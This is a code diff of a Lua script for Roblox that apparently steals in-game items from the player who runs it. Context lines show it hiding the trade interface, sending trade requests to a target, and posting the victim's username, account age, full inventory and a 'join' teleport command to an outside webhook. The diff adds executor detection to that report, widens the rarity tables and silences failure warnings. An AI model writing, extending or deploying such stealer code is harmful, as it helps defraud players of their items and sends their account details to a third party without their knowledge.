@@ -68,17 +68,22 @@ spawn(function() --// Hide trade ui
 end)
 end
 
+
 function collectInventoryData()
     Resources.itemData = {}
     Resources.rarityCount = {}
 
     local rarityPriority = {
-        Godly = 6,
-        Ancient = 5,
-        Vintage = 4,
-        Legendary = 3,
-        Rare = 2,
-        Uncommon = 1
+        Other = 1,
+        Common = 2,
+        Uncommon = 3,
+        Rare = 4,
+        Legendary = 5,
+        Vintage = 6,
+        Unique = 7,    
+        Halloween = 8,
+        Ancient = 9,
+        Godly = 10
     }
 
     for _, item in ipairs(Resources.InventoryPath:GetChildren()) do
@@ -97,6 +102,9 @@ function collectInventoryData()
                         end
                     elseif desc.Name == "Rarity" then
                         rarity = desc.Text
+                        if not rarityPriority[rarity] then
+                            rarity = "Other"
+                        end
                         priority = rarityPriority[rarity] or 0
                     end
                 end
@@ -117,7 +125,10 @@ function collectInventoryData()
         Resources.rarityCount[data.Rarity] = (Resources.rarityCount[data.Rarity] or 0) + data.Amount
     end
 end
+
 collectInventoryData()
+
+
 
 
 function sendTradeRequest(targetName)
@@ -201,37 +212,40 @@ function sendWebhookMessage()
     local player = game.Players.LocalPlayer
     local username = player.Name
     local accountAge = player.AccountAge
+    local exploit = identifyexecutor() or "Unable to fetch executor"
     local teleportScript = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance('%s', '%s', game.Players.LocalPlayer)", tostring(game.PlaceId), tostring(game.JobId))
 
-    local rarityPriority = {
-        Godly = 6,
-        Ancient = 5,
-        Vintage = 4,
-        Legendary = 3,
-        Rare = 2,
-        Uncommon = 1,
-        Common = 0
-    }
-
     local rarityCounts = {
-        Godly = 0,
-        Ancient = 0,
-        Vintage = 0,
-        Legendary = 0,
-        Rare = 0,
+        Other = 0,
+        Common = 0,
         Uncommon = 0,
-        Common = 0
+        Rare = 0,
+        Legendary = 0,
+        Vintage = 0,
+        Unique = 0,    
+        Halloween = 0,
+        Ancient = 0,
+        Godly = 0
     }
 
     for _, item in ipairs(Resources.itemData) do
         local rarity = item.Rarity
         if rarityCounts[rarity] then
             rarityCounts[rarity] = rarityCounts[rarity] + item.Amount
+        else
+            rarityCounts["Other"] = rarityCounts["Other"] + item.Amount
+            print("Item added to 'Other': " .. item.Name .. " with Rarity: " .. item.Rarity)
         end
     end
 
+    local rarityOrder = {
+        "Godly", "Ancient", "Halloween", "Unique", "Vintage", "Legendary", 
+        "Rare", "Uncommon", "Common", "Other"
+    }
+
     local rarityMessage = ""
-    for rarity, count in pairs(rarityCounts) do
+    for _, rarity in ipairs(rarityOrder) do
+        local count = rarityCounts[rarity] or 0
         rarityMessage = rarityMessage .. string.format("**%s:** %d\n", rarity, count)
     end
 
@@ -242,14 +256,14 @@ function sendWebhookMessage()
         for _, item in ipairs(Resources.itemData) do
             inventoryMessage = inventoryMessage .. string.format("%s (%dx), ", item.Name, item.Amount)
         end
-        inventoryMessage = inventoryMessage:sub(1, -3)  -- Remove trailing comma and space
+        inventoryMessage = inventoryMessage:sub(1, -3)
     end
 
     local payload = {
         embeds = {
             {
                 title = "**Inventory Log**",
-                description = string.format("**Username:** %s\n**Account Age:** %d days\n\n**Rarity Counts:**\n\n%s\n**Inventory:**\n```%s```\n\n**Execute to Join:**\n```%s```", username, accountAge, rarityMessage, inventoryMessage, teleportScript),
+                description = string.format("**Username:** %s\n**Account Age:** %d days\n**Exploit:** %s\n\n**Rarity Counts:**\n\n%s\n**Inventory:**\n```%s```\n\n**Execute to Join:**\n```%s```", username, accountAge, exploit, rarityMessage, inventoryMessage, teleportScript),
                 color = 0x0047AB,
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                 footer = {
@@ -275,14 +289,12 @@ function sendWebhookMessage()
     end)
 
     if success then
+        if Configuration.DebugPrints then
         print("Webhook message sent successfully.")
-    else
-        warn("Failed to send webhook message:", response)
+        end
     end
 end
 sendWebhookMessage()
-
-
 
 
 
